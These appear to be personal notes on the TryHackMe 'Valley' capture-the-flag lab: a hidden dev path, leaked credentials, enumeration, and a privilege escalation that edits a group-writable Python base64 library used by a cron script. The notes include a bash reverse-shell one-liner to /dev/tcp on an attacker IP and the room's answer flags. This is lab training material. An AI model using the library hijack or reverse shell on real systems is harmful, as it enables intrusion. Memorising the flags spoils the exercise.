[TryHackMe | Valley](https://tryhackme.com/room/valleype)

[TryHackMe "Valley" Writeup](https://youtu.be/Dbu6HI5JRnU)

http://10.10.132.96/static/00
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts

http://10.10.132.96/dev1243224123123/


```
valleyDev@valley:~$ cat user.txt 
THM{k@l1_1n_th3_v@lley}
```

![[Pasted image 20230527183730.png]]

![[Pasted image 20230527183934.png]]

```
$cat /etc/passwd |grep -E sh$
```

```
valley:liberty123
```

```
find / -group valleyAdmin -ls 2>/dev/null
```

![[Pasted image 20230527192107.png]]

```
cat /etc/crontab
```
![[Pasted image 20230527192600.png]]

```
valley@valley:~$ find / -group valleyAdmin -ls 2>/dev/null
   263787     20 drwxrwxr-x  30 root     valleyAdmin    20480 Mar 20 07:48 /usr/lib/python3.8
   263097     20 -rwxrwxr-x   1 root     valleyAdmin    20382 Mar 13 03:26 /usr/lib/python3.8/base64.py
valley@valley:~$ 
```

```
python3 /photos/script/photosEncrypt.py
```
![[Pasted image 20230527192751.png]]

```
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
```

```
nano /usr/lib/python3.8/base64.py
```

```
import os

os.system('ping -c 2 10.17.44.152')
```

![[Pasted image 20230527193831.png]]

```
tcpdump -i tun0 icmp
```

![[Pasted image 20230527194252.png]]

```
nc -vnlp 9001
```

```
/bin/bash -c \'bash -i >& /dev/tcp/10.17.44.152/9001 0>&1\'
```
![[Pasted image 20230527194652.png]]

```
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```


![[Pasted image 20230527195025.png]]

![[Pasted image 20230723090424.png]]
